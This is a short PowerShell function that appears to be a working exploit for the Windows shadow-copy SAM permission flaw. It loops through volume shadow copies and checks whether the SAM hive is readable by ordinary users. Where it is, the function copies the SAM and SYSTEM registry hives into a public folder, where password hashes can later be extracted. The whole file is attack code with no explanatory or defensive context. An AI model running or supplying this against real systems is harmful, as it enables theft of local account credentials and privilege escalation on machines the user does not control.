function Invoke-BenTamam
{

	for ($i = 1; $i -lt 99; $i++)
	{
		$path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\sam"
		if(((Get-ItemProperty -LiteralPath $path).Count -gt 0) -and ((Get-Acl -LiteralPath $path).Access | where{($_.IdentityReference -eq "BUILTIN\Users") -and ($_.FileSystemRights -like "*Read*")}).Count -gt 0)
		{
			Write-Output $path
			[System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sammy$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\sam"))
			[System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\sys$i",[System.IO.File]::ReadAllBytes("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$i\Windows\System32\config\system"))
		}
	}
}
